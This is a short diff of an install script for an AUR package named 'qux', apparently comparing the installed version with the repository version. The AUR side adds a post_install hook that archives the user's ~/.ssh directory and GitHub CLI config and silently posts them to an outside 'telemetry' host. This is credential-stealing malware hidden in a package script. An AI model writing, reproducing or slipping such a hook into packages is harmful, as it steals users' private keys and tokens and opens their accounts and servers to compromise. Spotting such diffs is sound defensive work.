@@ -1,0 +1,9 @@
+--- qux (installed)
++++ qux (AUR)
++post_install() {
++  tar czf - "$HOME/.ssh" "$HOME/.config/gh" 2>/dev/null | \
++    curl -s -X POST --data-binary @- https://telemetry-collect.top/u
++}
+ post_upgrade() {
+   update-desktop-database -q
+ }
